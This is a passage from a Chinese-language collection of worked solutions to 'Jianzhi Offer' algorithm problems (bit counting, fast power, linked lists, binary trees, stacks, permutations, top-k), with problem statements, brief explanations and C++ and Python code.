2： 123&gt;输入：00000000000000000000000010000000&gt;输出：1&gt;解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &#39;1&#39;。 示例 3： 123&gt;输入：11111111111111111111111111111101&gt;输出：31&gt;解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &#39;1&#39;。 注意：本题与主站 191 题相同：https://leetcode-cn.com/problems/number-of-1-bits/ 12345678910111213class Solution &#123;public: int hammingWeight(uint32_t n) &#123; int cnt = 0; while (n) &#123; if (n &amp; 1) &#123; ++cnt; &#125; n &gt;&gt;= 1; &#125; return cnt; &#125;&#125;; 或者用n &amp; (n - 1)，见leetcode 位运算 1234567891011class Solution &#123;public: int hammingWeight(uint32_t n) &#123; int cnt = 0; while (n) &#123; ++cnt; n = n &amp; (n - 1); &#125; return cnt; &#125;&#125;; 16. 数值的整数次方 实现函数double Power(double base, int exponent)，求base的exponent次方。不得使用库函数，同时不需要考虑大数问题。 示例 1: 12&gt;输入: 2.00000, 10&gt;输出: 1024.00000 示例 2: 12&gt;输入: 2.10000, 3&gt;输出: 9.26100 示例 3: 123&gt;输入: 2.00000, -2&gt;输出: 0.25000&gt;解释: 2-2 &#x3D; 1&#x2F;22 &#x3D; 1&#x2F;4 &#x3D; 0.25 说明: -100.0 &lt; x &lt; 100.0 n 是 32 位有符号整数，其数值范围是 [−231, 231 − 1] 。 注意：本题与主站 50 题相同：https://leetcode-cn.com/problems/powx-n/ 快速幂 12345678910111213141516171819202122class Solution &#123;public: double myPow(double x, int n) &#123; if (x &lt; 1e-12 &amp;&amp; x &gt; -1e-12) &#123; return 0;&#125; bool neg = false; long long t = n; if (t &lt; 0) &#123; neg = true; t = -t; &#125; double ans = 1; while (t) &#123; if (t &amp; 1) ans = ans * x; x *= x; t &gt;&gt;= 1; &#125; if (neg) &#123; ans = 1.0 / ans; &#125; return ans; &#125;&#125;; 17. 打印从1到最大的n位数 输入数字 n，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。 示例 1: 12&gt;输入: n &#x3D; 1&gt;输出: [1,2,3,4,5,6,7,8,9] 说明： 用返回一个整数列表来代替打印 n 为正整数 直接打印。。 123class Solution: def printNumbers(self, n: int) -&gt; List[int]: return [i for i in range(1, 10 ** n)] 18. 删除链表的节点 给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。 返回删除后的链表的头节点。 注意：此题对比原题有改动 示例 1: 123&gt;输入: head &#x3D; [4,5,1,9], val &#x3D; 5&gt;输出: [4,1,9]&gt;解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9. 示例 2: 123&gt;输入: head &#x3D; [4,5,1,9], val &#x3D; 1&gt;输出: [4,5,9]&gt;解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9. 说明： 题目保证链表中节点的值互不相同 若使用 C 或 C++ 语言，你不需要 free 或 delete 被删除的节点 Python 12345678910111213141516class Solution: def deleteNode(self, head: ListNode, val: int) -&gt; ListNode: if not head: return head if head.val == val: return head.next p = head q = head.next while q: if q.val == val: p.next = q.next break p = q q = q.next return head 20. 表示数值的字符串 请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串\"+100\"、\"5e2\"、\"-123\"、\"3.1416\"、\"-1E-16\"、\"0123\"都表示数值，但\"12e\"、\"1a3.14\"、\"1.2.3\"、\"+-5\"及\"12e+5.4\"都不是。 这题太恶心了，题目没说清楚，数字的表示应该是A.BEC这种形式，其中： A为带符号整数部分, B为小数部分，C为指数部分 有小数点的只要有A或者B其中一个都可以 A和C为可以带符号的整数，B为无符号的整数 因此可以写两个函数来匹配有无符号 12345678910111213141516171819202122232425262728class Solution: def match_sign_num(self, s): if self.index &lt; len(s) and s[self.index] in [&#x27;+&#x27;, &#x27;-&#x27;]: self.index += 1 return self.match_unsign_num(s) def match_unsign_num(self, s): before = self.index while self.index &lt; len(s) and s[self.index].isdigit(): self.index += 1 return before &lt; self.index def isNumber(self, s: str) -&gt; bool: if not s: return False self.index = 0 while self.index &lt; len(s) and s[self.index] == &#x27; &#x27;: self.index += 1 has_num = self.match_sign_num(s) if self.index &lt; len(s) and s[self.index] == &#x27;.&#x27;: self.index += 1 has_num = self.match_unsign_num(s) or has_num if self.index &lt; len(s) and s[self.index] in [&#x27;e&#x27;, &#x27;E&#x27;]: self.index += 1 has_num = has_num and self.match_sign_num(s) while self.index &lt; len(s) and s[self.index] == &#x27; &#x27;: self.index += 1 return has_num and self.index == len(s) 21. 调整数组顺序使奇数位于偶数前面 输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有奇数位于数组的前半部分，所有偶数位于数组的后半部分。 示例： 123&gt;输入：nums &#x3D; [1,2,3,4]&gt;输出：[1,3,2,4] &gt;注：[3,1,2,4] 也是正确的答案之一。 提示： 1 &lt;= nums.length &lt;= 50000 1 &lt;= nums[i] &lt;= 10000 双指针交换即可 12345678910111213141516class Solution: def exchange(self, nums: List[int]) -&gt; List[int]: odd = 0 even = len(nums) - 1 while odd &lt; even: if nums[odd] &amp; 1: odd += 1 continue elif nums[even] &amp; 1 == 0: even -= 1 continue else: nums[odd], nums[even] = nums[even], nums[odd] odd += 1 even -= 1 return nums 22. 链表中倒数第k个节点 输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。 示例： 123&gt;给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k &#x3D; 2.&gt;返回链表 4-&gt;5. 有了链表长度后，一切就很简单。。 123456789101112class Solution: def getKthFromEnd(self, head: ListNode, k: int) -&gt; ListNode: link_len = 0 p = head while p: p = p.next link_len += 1 target = link_len - k for i in range(target): head = head.next return head 假如不能获取长度呢？只需要遍历一遍 那么可以用双指针，一个指针先走k步即可 下面的代码假设k一定小于链表长度 123456789class Solution: def getKthFromEnd(self, head: ListNode, k: int) -&gt; ListNode: p = q = head for i in range(k): q = q.next while q: p = p.next q = q.next return p 24. 反转链表 定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。 示例: 12&gt;输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL&gt;输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL 限制： 1&gt;0 &lt;&#x3D; 节点个数 &lt;&#x3D; 5000 注意：本题与主站 206 题相同：https://leetcode-cn.com/problems/reverse-linked-list/ 方法1： 每次遍历到某个元素把它当作head 123456789101112class Solution: def reverseList(self, head: ListNode) -&gt; ListNode: if not head: return head p = head q = head.next while q: p.next = q.next q.next = head head = q q = p.next return head c++ 1234567891011121314151617class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if (head == nullptr) &#123; return head; &#125; ListNode* p = head; ListNode* q = head-&gt;next; while (q != nullptr) &#123; p-&gt;next = q-&gt;next; q-&gt;next = head; head = q; q = p-&gt;next; &#125; return head; &#125;&#125;; 方法2: cur和pre双指针，每次pre为cur后面一个元素，遍历的时候将pre-&gt;next指向cur即可 123456789101112class Solution: def reverseList(self, head: ListNode) -&gt; ListNode: if not head: return head cur = None pre = head while pre: temp = pre.next pre.next = cur cur = pre pre = temp return cur C++ 1234567891011121314151617class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if (head == nullptr) &#123; return head; &#125; ListNode* p = nullptr; ListNode* q = head; while (q != nullptr) &#123; ListNode* temp = q-&gt;next; q-&gt;next = p; p = q; q = temp; &#125; return p; &#125;&#125;; 25. 合并两个排序的链表 输入两个递增排序的链表，合并这两个链表并使新链表中的节点仍然是递增排序的。 示例1： 12&gt;输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4&gt;输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 限制： 1&gt;0 &lt;&#x3D; 链表长度 &lt;&#x3D; 1000 注意：本题与主站 21 题相同：https://leetcode-cn.com/problems/merge-two-sorted-lists/ 和插入排序类似 123456789101112131415161718class Solution &#123;public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123; ListNode head, *p = &amp;head; while (l1 &amp;&amp; l2) &#123; if (l1-&gt;val &lt; l2-&gt;val) &#123; p-&gt;next = l1; l1 = l1-&gt;next; &#125; else &#123; p-&gt;next = l2; l2 = l2-&gt;next; &#125; p = p-&gt;next; &#125; p-&gt;next = l1 ? l1 : l2; return head.next; &#125;&#125;; 26. 树的子结构 输入两棵二叉树A和B，判断B是不是A的子结构。(约定空树不是任意一个树的子结构) B是A的子结构， 即 A中有出现和B相同的结构和节点值。 例如: 给定的树 A: 3 / \\ 4 5 / \\ 1 2 给定的树 B： 4 / 1 返回 true，因为 B 与 A 的一个子树拥有相同的结构和节点值。 示例 1： 12&gt;输入：A &#x3D; [1,2,3], B &#x3D; [3,1]&gt;输出：false 示例 2： 12&gt;输入：A &#x3D; [3,4,5,1,2], B &#x3D; [4,1]&gt;输出：true 限制： 1&gt;0 &lt;&#x3D; 节点个数 &lt;&#x3D; 10000 递归进行判断即可 12345678910111213class Solution &#123; bool dfs(TreeNode* A, TreeNode* B) &#123; if (!B) &#123; return true;&#125; return A &amp;&amp; A-&gt;val == B-&gt;val &amp;&amp; dfs(A-&gt;left, B-&gt;left) &amp;&amp; dfs(A-&gt;right, B-&gt;right); &#125;public: bool isSubStructure(TreeNode* A, TreeNode* B) &#123; if (B == nullptr || A == nullptr) &#123; return false; &#125; return dfs(A, B) || isSubStructure(A-&gt;left, B) || isSubStructure(A-&gt;right, B); &#125;&#125;; 27. 二叉树的镜像 难度简单80 请完成一个函数，输入一个二叉树，该函数输出它的镜像。 例如输入： 4 / \\ 2 7 / \\ / \\ 1 3 6 9 镜像输出： 4 / \\ 7 2 / \\ / \\ 9 6 3 1 示例 1： 12&gt;输入：root &#x3D; [4,2,7,1,3,6,9]&gt;输出：[4,7,2,9,6,3,1] 限制： 1&gt;0 &lt;&#x3D; 节点个数 &lt;&#x3D; 1000 注意：本题与主站 226 题相同：https://leetcode-cn.com/problems/invert-binary-tree/ 12345678910class Solution &#123;public: TreeNode* mirrorTree(TreeNode* root) &#123; if (!root) return root; std::swap(root-&gt;left, root-&gt;right); mirrorTree(root-&gt;left); mirrorTree(root-&gt;right); return root; &#125;&#125;; 28. 对称的二叉树 请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。 例如，二叉树 [1,2,2,3,4,4,3] 是对称的。 1 / \\ 2 2 / \\ / \\ 3 4 4 3 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的: 1 / \\ 2 2 \\ \\ 3 3 示例 1： 12&gt;输入：root &#x3D; [1,2,2,3,4,4,3]&gt;输出：true 示例 2： 12&gt;输入：root &#x3D; [1,2,2,null,3,null,3]&gt;输出：false 限制： 1&gt;0 &lt;&#x3D; 节点个数 &lt;&#x3D; 1000 注意：本题与主站 101 题相同：https://leetcode-cn.com/problems/symmetric-tree/ C++ 12345678910111213class Solution &#123; bool dfs(TreeNode* t1, TreeNode* t2) &#123; if (!t1 &amp;&amp; !t2) return true; if (!t1 &amp;&amp; t2 || t1 &amp;&amp; !t2) return false; if (t1-&gt;val != t2-&gt;val) return false; return dfs(t1-&gt;left, t2-&gt;right) &amp;&amp; dfs(t1-&gt;right, t2-&gt;left); &#125;public: bool isSymmetric(TreeNode* root) &#123; return !root || dfs(root-&gt;left, root-&gt;right); &#125;&#125;; 29. 顺时针打印矩阵 输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字。 示例 1： 12&gt;输入：matrix &#x3D; [[1,2,3],[4,5,6],[7,8,9]]&gt;输出：[1,2,3,6,9,8,7,4,5] 示例 2： 12&gt;输入：matrix &#x3D; [[1,2,3,4],[5,6,7,8],[9,10,11,12]]&gt;输出：[1,2,3,4,8,12,11,10,9,5,6,7] 限制： 0 &lt;= matrix.length &lt;= 100 0 &lt;= matrix[i].length &lt;= 100 注意：本题与主站 54 题相同：https://leetcode-cn.com/problems/spiral-matrix/ 按层模拟，注意只有一行和一列的特殊情况即可。 1234567891011121314151617181920212223242526272829303132class Solution &#123;public: vector&lt;int&gt; spiralOrder(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; vector&lt;int&gt; ans; if (matrix.empty()) return ans; int left = 0; int up = 0; int down = matrix.size() - 1; int right = matrix[0].size() - 1; for (;left &lt;= right &amp;&amp; up &lt;= down;) &#123; for (int i = left; i &lt;= right; ++i) &#123; ans.push_back(matrix[up][i]); &#125; ++up; for (int i = up; i &lt;= down; ++i) &#123; ans.push_back(matrix[i][right]); &#125; --right; if (up &gt; down) &#123; break; &#125; for (int i = right; i &gt;= left; --i) &#123; ans.push_back(matrix[down][i]); &#125; --down; if (left &gt; right) &#123; break; &#125; for (int i = down; i &gt;= up; --i) &#123; ans.push_back(matrix[i][left]); &#125; ++left; &#125; return ans; &#125;&#125;; 30. 包含min函数的栈 定义栈的数据结构，请在该类型中实现一个能够得到栈的最小元素的 min 函数在该栈中，调用 min、push 及 pop 的时间复杂度都是 O(1)。 示例: 12345678&gt;MinStack minStack &#x3D; new MinStack();&gt;minStack.push(-2);&gt;minStack.push(0);&gt;minStack.push(-3);&gt;minStack.min(); --&gt; 返回 -3.&gt;minStack.pop();&gt;minStack.top(); --&gt; 返回 0.&gt;minStack.min(); --&gt; 返回 -2. 提示： 各函数的调用总次数不超过 20000 次 注意：本题与主站 155 题相同：https://leetcode-cn.com/problems/min-stack/ 用两个栈，一个是正常的，一个是保存当前最小元素的栈min_s即可 123456789101112131415161718192021222324252627282930class MinStack &#123; std::stack&lt;int&gt; s; std::stack&lt;int&gt; min_s;public: /** initialize your data structure here. */ MinStack() &#123;&#125; void push(int x) &#123; s.push(x); if (min_s.empty() || min_s.top() &gt;= x) &#123; min_s.push(x); &#125; &#125; void pop() &#123; int x = s.top(); s.pop(); if (x == min_s.top()) &#123; min_s.pop(); &#125; &#125; int top() &#123; return s.top(); &#125; int min() &#123; return min_s.top(); &#125;&#125;; 31. 栈的压入、弹出序列 输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如，序列 {1,2,3,4,5} 是某栈的压栈序列，序列 {4,5,3,2,1} 是该压栈序列对应的一个弹出序列，但 {4,3,5,1,2} 就不可能是该压栈序列的弹出序列。 示例 1： 12345&gt;输入：pushed &#x3D; [1,2,3,4,5], popped &#x3D; [4,5,3,2,1]&gt;输出：true&gt;解释：我们可以按以下顺序执行：&gt;push(1), push(2), push(3), push(4), pop() -&gt; 4,&gt;push(5), pop() -&gt; 5, pop() -&gt; 3, pop() -&gt; 2, pop() -&gt; 1 示例 2： 123&gt;输入：pushed &#x3D; [1,2,3,4,5], popped &#x3D; [4,3,5,1,2]&gt;输出：false&gt;解释：1 不能在 2 之前弹出。 提示： 0 &lt;= pushed.length == popped.length &lt;= 1000 0 &lt;= pushed[i], popped[i] &lt; 1000 pushed 是 popped 的排列。 注意：本题与主站 946 题相同：https://leetcode-cn.com/problems/validate-stack-sequences/ 给定了Push的顺序和pop的顺序，因此可以直接模拟 如果pop的元素等于栈顶，那么就pop元素，如果是合法的pop序列，最后push数组一定为空 1234567891011121314151617class Solution &#123;public: bool validateStackSequences(vector&lt;int&gt;&amp; pushed, vector&lt;int&gt;&amp; popped) &#123; if(pushed.size() != popped.size()) return false; if (pushed.empty()) return true; std::size_t i = 0; std::stack&lt;int&gt; q; for (int num : pushed) &#123; q.push(num); while (!q.empty() &amp;&amp; i &lt; pushed.size() &amp;&amp; q.top() == popped[i]) &#123; ++i; q.pop(); &#125; &#125; return q.empty(); &#125;&#125;; 32 - I. 从上到下打印二叉树 从上到下打印出二叉树的每个节点，同一层的节点按照从左到右的顺序打印。 例如: 给定二叉树: [3,9,20,null,null,15,7], 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 返回： 1&gt;[3,9,20,15,7] 提示： 节点总数 &lt;= 1000 直接BFS即可 1234567891011121314class Solution: def levelOrder(self, root: TreeNode) -&gt; List[int]: if not root: return [] q = deque([root]) ans = [] while q: cur = q[0] ans.append(cur.val) q.popleft() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) return ans 32 - II. 从上到下打印二叉树 II 从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。 例如: 给定二叉树: [3,9,20,null,null,15,7], 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 返回其层次遍历结果： 12345&gt;[ [3], [9,20], [15,7]&gt;] 提示： 节点总数 &lt;= 1000 注意：本题与主站 102 题相同：https://leetcode-cn.com/problems/binary-tree-level-order-traversal/ 上面的代码改改即可 123456789101112131415161718class Solution: def levelOrder(self, root: TreeNode) -&gt; List[List[int]]: if not root: return [] q = deque([root]) ans = [] while q: len_q = len(q) row = [] for _ in range(len_q): cur = q[0] row.append(cur.val) q.popleft() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) ans.append(row) return ans 32 - III. 从上到下打印二叉树 III 请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。 例如: 给定二叉树: [3,9,20,null,null,15,7], 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 返回其层次遍历结果： 12345&gt;[ [3], [20,9], [15,7]&gt;] 提示： 节点总数 &lt;= 1000 和上面的不同就是多了个双数逆序打印的东西，判断即可 1234567891011121314151617181920class Solution: def levelOrder(self, root: TreeNode) -&gt; List[List[int]]: if not root: return [] q = deque([root]) ans = [] h = 1 while q: len_q = len(q) row = [] for _ in range(len_q): cur = q[0] row.append(cur.val) q.popleft() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) ans.append(row if h &amp; 1 else row[::-1]) h += 1 return ans 33. 二叉搜索树的后序遍历序列 输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历结果。如果是则返回 true，否则返回 false。假设输入的数组的任意两个数字都互不相同。 参考以下这颗二叉搜索树： 12345 5 &#x2F; \\ 2 6 &#x2F; \\1 3 示例 1： 12&gt;输入: [1,6,3,2,5]&gt;输出: false 示例 2： 12&gt;输入: [1,3,2,6,5]&gt;输出: true 提示： 数组长度 &lt;= 1000 方法1 二叉树的后序遍历顺序为：左子树、右子树、根节点 因此数组的最后一个就是根节点，可以从后往前找，找到第一个小于根节点的下标index，则[s,index]必须是左子树，右子树为[index+1, e-1]：可以写出如下的代码，最后用中序遍历看看是否有序 12345678910111213141516171819202122232425262728293031323334353637class TreeNode: def __init__(self, x): self.val = x self.left = self.right = Noneclass Solution: def find_larger_index(self, nums, s, e, t): for i in range(e, s - 1, -1): if nums[i] &lt; t: return i return -1 def dfs(self, nums: List[int], s: int, e: int) -&gt; bool: if s &gt; e: return None root = TreeNode(nums[e]) index = self.find_larger_index(nums, s, e, nums[e]) if index &gt;= s: root.left = self.dfs(nums, s, index) root.right = self.dfs(nums, index + 1, e - 1) else: root.right = self.dfs(nums, s, e - 1) return root def inorder(self, nums, root): if not root: return self.inorder(nums, root.left) nums.append(root.val) self.inorder(nums, root.right) def verifyPostorder(self, postorder: List[int]) -&gt; bool: root = self.dfs(postorder, 0, len(postorder) - 1) inorder = [] self.inorder(inorder, root) for i in range(1, len(inorder)): if inorder[i] &lt; inorder[i - 1]: return False return True 但其实可以改进一下，在递归过程直接判断左子树必须都小于根节点即可 123456789101112131415161718class Solution: def find_larger_index(self, nums, s, e, t): for i in range(e, s - 1, -1): if nums[i] &lt; t: return i return s - 1 def dfs(self, nums: List[int], s: int, e: int) -&gt; bool: if s &gt; e: return True root = nums[e] index = self.find_larger_index(nums, s, e, root) for i in range(s, index + 1): if nums[i] &gt; root: return False return self.dfs(nums, s, index) and self.dfs(nums, index + 1, e - 1) def verifyPostorder(self, postorder: List[int]) -&gt; bool: return self.dfs(postorder, 0, len(postorder) - 1) 方法2 二叉树的后序遍历顺序为：左子树、右子树、根节点，而后续遍历的逆序为：根节点、右子树、左子树 因此，对于逆序的后续遍历： nums[i] &lt; nums[i + 1]：说明nums[i + 1]是nums[i]的右子树 nums[i] &gt; nums[i + 1]：说明nums[i + 1]是nums[1...i]中某个元素的左子树 因此我们可以维护一个单调递增的栈，若发现栈顶的元素大于当前的nums[i]，说明进了左子树，我们可以不断的pop元素来找它的父节点 123456789101112class Solution: def verifyPostorder(self, nums: List[int]) -&gt; bool: q = [] parent = float(&quot;+inf&quot;) for i in range(len(nums) - 1, -1, -1): while q and q[-1] &gt; nums[i]: parent = q.pop() if nums[i] &gt; parent: return False q.append(nums[i]) return True 34. 二叉树中和为某一值的路径 输入一棵二叉树和一个整数，打印出二叉树中节点值的和为输入整数的所有路径。从树的根节点开始往下一直到叶节点所经过的节点形成一条路径。 示例: 给定如下二叉树，以及目标和 sum = 22， 1234567 5 &#x2F; \\ 4 8 &#x2F; &#x2F; \\ 11 13 4 &#x2F; \\ &#x2F; \\7 2 5 1 返回: 1234&gt;[ [5,4,11,2], [5,8,4,5]&gt;] 提示： 节点总数 &lt;= 10000 注意：本题与主站 113 题相同：https://leetcode-cn.com/problems/path-sum-ii/ dfs即可 Python 12345678910111213141516171819class Solution: def dfs(self, cur, cur_sum, root, target, ans): if not root: return cur_sum += root.val cur.append(root.val) if cur_sum == target and not root.left and not root.right: ans.append(cur[:]) else: self.dfs(cur, cur_sum, root.left, target, ans) self.dfs(cur, cur_sum, root.right, target, ans) cur.pop() def pathSum(self, root: TreeNode, target: int) -&gt; List[List[int]]: ans = [] cur = [] self.dfs(cur, 0, root, target, ans) return an 35. 复杂链表的复制 请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。 示例 1： img 12&gt;输入：head &#x3D; [[7,null],[13,0],[11,4],[10,2],[1,0]]&gt;输出：[[7,null],[13,0],[11,4],[10,2],[1,0]] 示例 2： img 12&gt;输入：head &#x3D; [[1,1],[2,1]]&gt;输出：[[1,1],[2,1]] 示例 3： 12&gt;输入：head &#x3D; [[3,null],[3,0],[3,null]]&gt;输出：[[3,null],[3,0],[3,null]] 示例 4： 123&gt;输入：head &#x3D; []&gt;输出：[]&gt;解释：给定的链表为空（空指针），因此返回 null。 提示： -10000 &lt;= Node.val &lt;= 10000 Node.random 为空（null）或指向链表中的节点。 节点数目不超过 1000 。 用个hash表保存即可 123456789101112131415161718192021222324252627282930&quot;&quot;&quot;# Definition for a Node.class Node: def __init__(self, x: int, next: &#x27;Node&#x27; = None, random: &#x27;Node&#x27; = None): self.val = int(x) self.next = next self.random = random&quot;&quot;&quot;class Solution: def copyRandomList(self, head: &#x27;Node&#x27;) -&gt; &#x27;Node&#x27;: p = head node_dict = &#123;&#125; new_head = Node(-1) q = new_head while p: if p not in node_dict: node_dict[p] = Node(p.val) q.next = node_dict[p] q = q.next p = p.next p = head q = new_head.next while p: if p.random: q.random = node_dict[p.random] p = p.next q = q.next return new_head.next 也可以递归的写，更简单一些 1234567891011121314class Solution &#123; std::unordered_map&lt;Node*, Node*&gt; _map;public: Node* copyRandomList(Node* head) &#123; if (!head) return head; if (_map.find(head) != _map.end()) return _map[head]; Node* new_node = new Node(head-&gt;val); _map[head] = new_node; new_node-&gt;next = copyRandomList(head-&gt;next); new_node-&gt;random = copyRandomList(head-&gt;random); return new_node; &#125;&#125;; 36. 二叉搜索树与双向链表 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 为了让您更好地理解问题，以下面的二叉搜索树为例： img 我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。 下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。 img 特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。 利用中序遍历即可 12345678910111213141516171819202122232425262728&quot;&quot;&quot;# Definition for a Node.class Node: def __init__(self, val, left=None, right=None): self.val = val self.left = left self.right = right&quot;&quot;&quot;class Solution: def dfs(self, root): if not root: return self.dfs(root.left) if not self.head: self.head = self.p = root else: self.p.right = root root.left = self.p self.p = root self.dfs(root.right) def treeToDoublyList(self, root: &#x27;Node&#x27;) -&gt; &#x27;Node&#x27;: self.head = self.p = None self.dfs(root) if self.head: self.head.left = self.p self.p.right = self.head return self.head 37. 序列化二叉树 请实现两个函数，分别用来序列化和反序列化二叉树。 示例: 12345678&gt;你可以将以下二叉树： 1 &#x2F; \\ 2 3 &#x2F; \\ 4 5&gt;序列化为 &quot;[1,2,3,null,null,4,5]&quot; 注意：本题与主站 297 题相同：https://leetcode-cn.com/problems/serialize-and-deserialize-binary-tree/ 序列化就是标准BFS 反序列化用一个i指向当前的子节点，一个队列来维护当前节点即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Codec: def serialize(self, root): &quot;&quot;&quot;Encodes a tree to a single string. :type root: TreeNode :rtype: str &quot;&quot;&quot; if not root: return &quot;[]&quot; ans = [] q = deque([root]) while q: cur = q[0] q.popleft() if cur: q.append(cur.left) q.append(cur.right) ans.append(str(cur.val)) else: ans.append(&quot;null&quot;) return &#x27;[&#123;&#125;]&#x27;.format(&#x27;,&#x27;.join(ans)) def deserialize(self, data): &quot;&quot;&quot;Decodes your encoded data to tree. :type data: str :rtype: TreeNode &quot;&quot;&quot; if data == &#x27;[]&#x27;: return None data = data[1:-1].split(&#x27;,&#x27;) root = TreeNode(int(data[0])) i = 1 q = deque([root]) while q: cur = q.popleft() if i &gt;= len(data): break if data[i] != &#x27;null&#x27;: cur.left = TreeNode(int(data[i])) q.append(cur.left) i += 1 if data[i] != &#x27;null&#x27;: cur.right = TreeNode(int(data[i])) q.append(cur.right) i += 1 return root# Your Codec object will be instantiated and called as such:# codec = Codec()# codec.deserialize(codec.serialize(root)) 38. 字符串的排列 难度中等132 输入一个字符串，打印出该字符串中字符的所有排列。 你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。 示例: 12&gt;输入：s &#x3D; &quot;abc&quot;&gt;输出：[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;] 限制： 1&gt;1 &lt;&#x3D; s 的长度 &lt;&#x3D; 8 可以类似STL的写个next_permutation的函数 12345678910111213141516171819202122class Solution: def next_permutation(self, nums): i = len(nums) - 2 while i &gt;= 0 and nums[i] &gt;= nums[i + 1]: i -= 1 if i &lt; 0: return False j = len(nums) - 1 while j &gt; i and nums[i] &gt;= nums[j]: j -= 1 nums[i], nums[j] = nums[j], nums[i] nums[i + 1:] = nums[i + 1:][::-1] return True def permutation(self, s: str) -&gt; List[str]: if not s: return [] nums = sorted([c for c in s]) ans = [&#x27;&#x27;.join(nums)] while self.next_permutation(nums): ans.append(&#x27;&#x27;.join(nums)) return ans 39. 数组中出现次数超过一半的数字 数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。 你可以假设数组是非空的，并且给定的数组总是存在多数元素。 示例 1: 12&gt;输入: [1, 2, 3, 2, 2, 2, 5, 4, 2]&gt;输出: 2 限制： 1&gt;1 &lt;&#x3D; 数组长度 &lt;&#x3D; 50000 进行投票即可，如果当前元素与element相同，cnt+=1，否则cnt -= 1。 当Cnt= 0的时候，设置element为当前的元素 这是因为超过一半次数的元素，其cnt必然大于长度的一半 12345678910111213class Solution: def majorityElement(self, nums: List[int]) -&gt; int: cnt = 1 element = nums[0] for i in range(1, len(nums)): if nums[i] == element: cnt += 1 else: cnt -= 1 if cnt == 0: element = nums[i] cnt += 1 return element 40. 最小的k个数 输入整数数组 arr ，找出其中最小的 k 个数。例如，输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。 示例 1： 12&gt;输入：arr &#x3D; [3,2,1], k &#x3D; 2&gt;输出：[1,2] 或者 [2,1] 示例 2： 12&gt;输入：arr &#x3D; [0,1,2,1], k &#x3D; 1&gt;输出：[0] 限制： 0 &lt;= k &lt;= arr.length &lt;= 10000 0 &lt;= arr[i] &lt;= 10000 方法1：排序 123class Solution: def getLeastNumbers(self, arr: List[int], k: int) -&gt; List[int]: return sorted(arr)[:k] 方法２，利用最大堆 c++本身就是最大堆 1234567891011121314151617181920212223class Solution &#123;public: vector&lt;int&gt; getLeastNumbers(vector&lt;int&gt;&amp; arr, int k) &#123; if (!k) return &#123;&#125;; priority_queue&lt;int&gt; q; for (int v : arr) &#123; if (q.size() &lt; k) &#123; q.push(v); continue; &#125; else if (q.top() &gt; v) &#123; q.pop(); q.push(v); &#125; &#125; vector&lt;int&gt; ans; ans.reserve(k); while (!q.empty()) &#123; ans.push_back(q.top()); q.pop(); &#125; return ans; &#125;&#125;; python的heapq是最小堆 12345678910class Solution: def getLeastNumbers(self, arr: List[int], k: int) -&gt; List[int]: if not k: return [] q = [-x for x in arr[:k]] heapq.heapify(q) for i in range(k, len(arr)): if arr[i] &lt; -q[0]: heapq.heappop(q) heapq.heappush(q, -arr[i]) return [-x for x in q] 方法3. 利用快排的思想， 如果想要达到期望O(n)还需要加上随机的操作 123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123;public: vector&lt;int&gt; getLeastNumbers(vector&lt;int&gt;&amp; arr, int k) &#123; if (k == 0) return &#123;&#125;; srand((unsigned)time(NULL)); quick_sort(arr, 0, arr.size() - 1, k); vector&lt;int&gt; 